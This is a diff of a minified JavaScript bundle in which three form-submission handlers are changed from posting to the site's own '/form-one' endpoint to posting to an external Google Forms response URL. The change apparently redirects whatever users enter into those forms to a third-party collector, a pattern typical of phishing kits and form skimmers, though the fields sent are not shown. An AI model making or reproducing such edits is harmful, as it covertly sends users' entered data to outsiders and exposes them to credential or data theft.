@@ -9814,7 +9814,7 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("/form-one", {
+                                    fetch("https://docs.google.com/forms/u/0/d/e/1FAIpQLSdmhg2aTu85-544HrRohGd7enivJ61L7dz03otY-ux-NAIbyw/formResponse", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13358,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("form-one", {
+                                    u && o ? (fetch("https://docs.google.com/forms/u/0/d/e/1FAIpQLSdmhg2aTu85-544HrRohGd7enivJ61L7dz03otY-ux-NAIbyw/formResponse", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("form-one", {
+                        fetch("https://docs.google.com/forms/u/0/d/e/1FAIpQLSdmhg2aTu85-544HrRohGd7enivJ61L7dz03otY-ux-NAIbyw/formResponse", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
